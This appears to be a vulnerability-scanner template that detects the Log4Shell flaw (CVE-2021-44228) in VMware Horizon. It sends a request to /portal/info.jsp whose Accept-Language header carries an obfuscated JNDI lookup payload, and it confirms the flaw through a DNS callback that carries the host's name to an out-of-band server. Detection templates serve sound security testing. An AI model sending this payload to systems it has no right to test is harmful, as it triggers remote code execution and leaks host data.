id: vmware-horizon-log4j-rce
brief:
    title: VMware Horizon - JNDI Remote Code Execution (Apache Log4j)
    by: johnk3r
    level: critical
    about: VMware Horizon is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a co...
    label:
        - cve
        - cve2021
        - rce
        - jndi
        - log4j
        - horizon
        - vmware
        - oast
        - kev
        - vuln
    score: CVE-2021-44228 CVSS:10.0
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/portal/info.jsp'
      head:
        Accept-Language: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
